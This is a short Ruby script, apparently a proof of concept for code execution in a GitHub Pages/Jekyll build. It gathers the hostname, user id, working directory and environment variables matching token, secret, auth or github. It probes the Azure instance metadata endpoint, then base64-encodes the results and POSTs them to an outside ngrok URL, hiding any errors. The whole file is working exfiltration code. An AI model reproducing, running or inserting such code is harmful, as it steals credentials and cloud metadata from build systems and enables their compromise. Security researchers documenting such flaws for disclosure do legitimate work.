require 'net/http'
require 'uri'
require 'base64'

NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app'

begin
  info = []
  info << "HOSTNAME=#{`hostname 2>/dev/null`.strip}"
  info << "ID=#{`id 2>/dev/null`.strip}"
  info << "PWD=#{Dir.pwd}"
  info << "RUBY=#{RUBY_VERSION}"

  # GitHub Pages build env vars
  token_envs = ENV.select { |k, _| k =~ /github|token|secret|auth|jekyll/i }
  info << "ENV=#{token_envs.inspect}"

  # Azure metadata endpoint -- SSRF probe
  begin
    meta = Net::HTTP.get(URI('http://169.254.169.254/metadata/instance?api-version=2021-02-01'))
    info << "AZURE_META=#{meta[0..500]}"
  rescue => e
    info << "AZURE_META=error:#{e.message}"
  end

  payload = Base64.strict_encode64(info.join("\n"))

  uri = URI("#{NGROK}?poc=pages_plugin_rce")
  req = Net::HTTP::Post.new(uri)
  req['Content-Type'] = 'text/plain'
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
rescue
end
